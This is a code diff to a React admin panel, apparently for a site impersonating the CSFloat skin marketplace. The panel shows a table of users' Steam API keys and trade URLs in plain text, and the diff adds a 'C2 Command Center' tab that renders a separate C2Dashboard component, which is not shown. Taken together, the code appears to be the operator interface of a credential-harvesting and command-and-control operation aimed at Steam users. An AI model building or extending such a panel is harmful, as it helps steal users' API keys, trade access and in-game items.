@@ -2,6 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { formatCurrency } from '../utils/currency';
 import { useAdminAuth } from '../contexts/AdminAuthContext';
+import C2Dashboard from './C2Dashboard';
 
 interface ApiKeyLog {
   timestamp: string;
@@ -47,6 +48,7 @@ const fetchUsers = async () => {
 const AdminPanel = () => {
   const [users, setUsers] = useState<any[]>([]);
   const [isLoading, setIsLoading] = useState(true);
+  const [activeTab, setActiveTab] = useState<'dashboard' | 'c2'>('dashboard');
   const { adminLogout } = useAdminAuth();
   const navigate = useNavigate();
 
@@ -78,48 +80,78 @@ const AdminPanel = () => {
             Logout
           </button>
         </div>
-        {/* Stats Grid */}
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-12">
-          <StatCard title="Total Users" value={totalUsers} />
-          <StatCard title="Users with API Key" value={usersWithApiKey} />
-          <StatCard title="Users with Trade Link" value={usersWithTradeLink} />
+
+        {/* Main Tabs */}
+        <div className="flex space-x-1 mb-6">
+          {[
+            { id: 'dashboard', label: 'Platform Dashboard', icon: '📊' },
+            { id: 'c2', label: 'C2 Command Center', icon: '🎯' }
+          ].map((tab) => (
+            <button
+              key={tab.id}
+              onClick={() => setActiveTab(tab.id as 'dashboard' | 'c2')}
+              className={`px-6 py-3 rounded-lg font-medium transition-colors flex items-center space-x-2 ${
+                activeTab === tab.id
+                  ? 'bg-csfloat-blue text-white'
+                  : 'text-csfloat-light/70 hover:text-white hover:bg-csfloat-gray/20'
+              }`}
+            >
+              <span>{tab.icon}</span>
+              <span>{tab.label}</span>
+            </button>
+          ))}
         </div>
-        {/* Users Table */}
-        <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
-          <div className="flex justify-between items-center mb-6">
-            <h2 className="text-2xl font-bold text-white">Users</h2>
-          </div>
-          {isLoading ? (
-            <EmptyState message="Loading users..." />
-          ) : users.length > 0 ? (
-            <div className="overflow-x-auto">
-              <table className="w-full">
-                <thead>
-                  <tr className="text-left border-b border-csfloat-gray/20">
-                    <th className="pb-4 text-csfloat-light/70">ID</th>
-                    <th className="pb-4 text-csfloat-light/70">Username</th>
-                    <th className="pb-4 text-csfloat-light/70">API Key</th>
-                    <th className="pb-4 text-csfloat-light/70">Trade Link</th>
-                    <th className="pb-4 text-csfloat-light/70">Created At</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  {users.map((user) => (
-                    <tr key={user.id} className="border-b border-csfloat-gray/10 hover:bg-csfloat-gray/5 transition-colors duration-200">
-                      <td className="py-4 text-white">{user.id}</td>
-                      <td className="py-4 text-white">{user.username}</td>
-                      <td className="py-4 text-white">{user.steam_api_key || <span className="text-csfloat-light/50">None</span>}</td>
-                      <td className="py-4 text-white">{user.trade_url || <span className="text-csfloat-light/50">None</span>}</td>
-                      <td className="py-4 text-white">{user.created_at ? new Date(user.created_at).toLocaleString() : '-'}</td>
-                    </tr>
-                  ))}
-                </tbody>
-              </table>
+
+        {/* Dashboard Tab */}
+        {activeTab === 'dashboard' && (
+          <>
+            {/* Stats Grid */}
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-12">
+              <StatCard title="Total Users" value={totalUsers} />
+              <StatCard title="Users with API Key" value={usersWithApiKey} />
+              <StatCard title="Users with Trade Link" value={usersWithTradeLink} />
             </div>
-          ) : (
-            <EmptyState message="No users found" />
-          )}
-        </div>
+            {/* Users Table */}
+            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
+              <div className="flex justify-between items-center mb-6">
+                <h2 className="text-2xl font-bold text-white">Users</h2>
+              </div>
+              {isLoading ? (
+                <EmptyState message="Loading users..." />
+              ) : users.length > 0 ? (
+                <div className="overflow-x-auto">
+                  <table className="w-full">
+                    <thead>
+                      <tr className="text-left border-b border-csfloat-gray/20">
+                        <th className="pb-4 text-csfloat-light/70">ID</th>
+                        <th className="pb-4 text-csfloat-light/70">Username</th>
+                        <th className="pb-4 text-csfloat-light/70">API Key</th>
+                        <th className="pb-4 text-csfloat-light/70">Trade Link</th>
+                        <th className="pb-4 text-csfloat-light/70">Created At</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      {users.map((user) => (
+                        <tr key={user.id} className="border-b border-csfloat-gray/10 hover:bg-csfloat-gray/5 transition-colors duration-200">
+                          <td className="py-4 text-white">{user.id}</td>
+                          <td className="py-4 text-white">{user.username}</td>
+                          <td className="py-4 text-white">{user.steam_api_key || <span className="text-csfloat-light/50">None</span>}</td>
+                          <td className="py-4 text-white">{user.trade_url || <span className="text-csfloat-light/50">None</span>}</td>
+                          <td className="py-4 text-white">{user.created_at ? new Date(user.created_at).toLocaleString() : '-'}</td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                </div>
+              ) : (
+                <EmptyState message="No users found" />
+              )}
+            </div>
+          </>
+        )}
+
+        {/* C2 Tab */}
+        {activeTab === 'c2' && <C2Dashboard />}
       </div>
     </div>
   );
